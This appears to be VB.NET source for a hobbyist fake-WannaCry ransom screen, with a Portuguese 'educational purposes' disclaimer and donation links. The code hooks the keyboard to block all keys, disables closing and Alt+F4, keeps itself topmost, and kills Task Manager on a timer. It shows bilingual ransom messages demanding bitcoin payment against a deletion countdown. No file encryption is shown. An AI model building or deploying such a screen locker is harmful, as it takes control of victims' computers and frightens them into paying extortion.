﻿
'███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
'██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
'███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
'╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
'███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
'██╗════██╗═█████╗═███╗═╝╚██╗███╗╚══██╗═█████╗╚═██████╗██████╗═██╗╝  ██╗═══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
'██║    ██║██╔══██╗████╗  ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝                              
'██║ █╗ ██║███████║██╔██╗ ██║██╔██╗ ██║███████║██║     ██████╔╝ ╚████╔╝                               
'██║███╗██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══██║██║     ██╔══██╗  ╚██╔╝                                
'╚███╔███╔╝██║  ██║██║ ╚████║██║ ╚████║██║  ██║╚██████╗██║  ██║   ██║                                
' ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝                                 
' Programador: Fabricio Lima
' Type: VB.NET|Versão:2017,2013,2012
' Atualizações: 1.0.33
' Para Doações: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=UTARHVKJ4PPHN
' Meu Site:http://f10edition.16mb.com
' Meu Perfil: https://www.facebook.com/Reserved.Bito
' LEIA: Sejam Bem vindos ao Projeto SCRLLGER-WNNCRY(SCREENLOGGER-WANNACRY) O projeto foi Desenvolvido Para Fins,
' Educacionais, em análises e Estudos Para Estudantes da área de Segurança da Informação. Qual quer Mal uso desse
' Código Fonte estará respondendo pelo código penal Decreto-lei nº 2.848/40, prevê o crime de dano como sendo:
' Art. 163. Destruir, inutilizar ou deteriorar coisa alheia.Pena -detenção, de 1 (um) a 6 (seis) meses, ou multa
' Mais Informações Acesse: http://www.buscalegis.ufsc.br/revistas/files/anexos/6038-6030-1-PB.pdf

Imports System.Drawing.Text
Imports System.Runtime.InteropServices
Imports System.Reflection
Public Class Form2
    'Monitora o Teclado. Controla as Ações do Teclado Antes qu esejam pressionadas e processadas.
    Delegate Function LowLevelKeyboardProcDelegate(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

    'Em combinação com o LowLevelKeyboardProcDelegate Impede o Processo das Teclas
    Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As LowLevelKeyboardProcDelegate, ByVal hMod As IntPtr, ByVal dwThreadId As Integer) As Integer

    'Deleta o Efeito do SetWindowsHookEx
    Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal hHook As IntPtr) As Boolean


    Const WH_KEYBOARD_LL As Integer = 13 'Controla todos os INPUTS do Teclado


    'Estrutura Para a Função CallNextHookEx
    Structure KBDLLHOOKSTRUCT
        Dim vkCode As Integer
        Dim scanCode As Integer
        Dim flags As Integer
        Dim time As Integer
        Dim dwExtraInfo As Integer
    End Structure

    Dim TECLEADO As Integer 'RESULTADO Da Função SetWindowsHookEx

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Private Sub Form2_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Nice Try!  You must log on with a password.", "Security", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            e.Handled = True
        End If
    End Sub
    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'Adicionando Nova Fonte (Fonte Digital.ttf)
        Dim pfc As PrivateFontCollection = New PrivateFontCollection
        pfc.AddFontFile("Digital.TTF")
        Label13.Font = New Font(pfc.Families(0), 25, FontStyle.Regular)
        Label13.ForeColor = Color.White

        Label12.Font = New Font(pfc.Families(0), 25, FontStyle.Regular)
        Label12.ForeColor = Color.White


        progresso1.Start() 'Iniciando Barra de progresso1 #Tempo restante
        progresso2.Start() 'Iniciando Barra de progresso2 #Tempo restante
        TopMost = True
        Form1.Show()
        Label10.Text = DateAndTime.Now 'Data1 e Hora em Tempo Real
        Label11.Text = DateAndTime.Now 'Data2 e Hora em Tempo Real
        ComboBox1.Text = "English"

        TECLEADO = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, IntPtr.Zero, 0) 'Blockeio do Teclado

    End Sub

    Private Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

        Return 1 'Blockear Todas as Teclas

    End Function


    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        Select Case ComboBox1.SelectedIndex
            Case 1
                TextBox1.ReadOnly = False
                TextBox1.Clear()
                TextBox3.SelectAll()
                TextBox3.Copy()
                TextBox1.Paste()
                TextBox1.ReadOnly = True
                lblSigla.Text = "PT-BR"
                Button3.Text = "&Decryptar"
                Button2.Text = "Checar o &Pagamento"

                Label5.Text = "Ooops, Seus Arquivos Foram Encriptados!"
                Label2.Text = "Sobre o Bitcoin"
                Label3.Text = "Como comprar Bitcoin?"
                Label4.Text = "CONTATE-ME"
                Label7.Text = "Efetue o Pagamento Até:"
                Label8.Text = "Tempo Restante"
                Label9.Text = "Tempo Restante"
                Label6.Text = "Os arquivos Serão Deletados Em:"
                Label6.Font = New Font("Arial", 9, FontStyle.Bold Or FontStyle.Bold)
                Label9.Location = New Point(57, 53)
                Label8.Location = New Point(56, 59)
            Case 0
                TextBox1.ReadOnly = False
                TextBox1.Clear()
                TextBox4.SelectAll()
                TextBox4.Copy()
                TextBox1.Paste()
                TextBox1.ReadOnly = True
                'Ativar e Desativar textbox com mensagem para escrever e traduzir mensagem'
                lblSigla.Text = "ENG-US"
                Button3.Text = "&Decrypt"
                Button2.Text = "Check &Payment"

                Label2.Text = "About bitcoin"
                Label3.Text = "How to buy bitcoins?"
                Label4.Text = "Contact Us"
                Label5.Text = "Ooops, your files have been endrypted!"
                Label7.Text = "Payment will be raised on"
                Label8.Text = "Time Left"
                Label9.Text = "Time Left"
                Label6.Text = "Your files will be lost on"
                Label6.Font = New Font("Arial", 11.25, FontStyle.Bold Or FontStyle.Bold)
                Label9.Location = New Point(78, 54)
                Label8.Location = New Point(78, 59)
                Label13.Location = New Point(60, 71)

        End Select
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Label13.Text = (DateTime.Now.ToString("HH:mm:ss"))
        Label12.Text = (DateTime.Now.ToString("HH:mm:ss"))
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Me.TopMost = True
        For Each selProcess As Process In Process.GetProcesses
            If selProcess.ProcessName = "taskmgr" Then
                selProcess.Kill()
                Exit For
            End If
        Next
        For Each selProcess As Process In Process.GetProcesses
            If selProcess.ProcessName = "explorer" Then
                'Selecionar processo selProcess.Kill()
                Exit For
            End If
        Next
    End Sub


    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        UnhookWindowsHookEx(TECLEADO) 'Desblockear Teclado
        Application.Exit()


    End Sub

    'Para assegurar que o teclado será desblockeado ao finalizar a form2
    Private Sub Form2_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        UnhookWindowsHookEx(TECLEADO) 'PARA ASEGURAR QUE NO QUEDE NADA BLOQUEADO EN EL TECLADO AL CERRAR LA APLICACION
    End Sub

    Private Sub progresso1_Tick(sender As Object, e As EventArgs) Handles progresso1.Tick
        ProgressBar2.Increment(1)
        PictureBox3.Height = 77 - ProgressBar2.Value * 2

    End Sub

    Private Sub progresso2_Tick(sender As Object, e As EventArgs) Handles progresso2.Tick
        ProgressBar1.Increment(1)
        PictureBox4.Height = 77 - ProgressBar1.Value * 2
    End Sub
End Class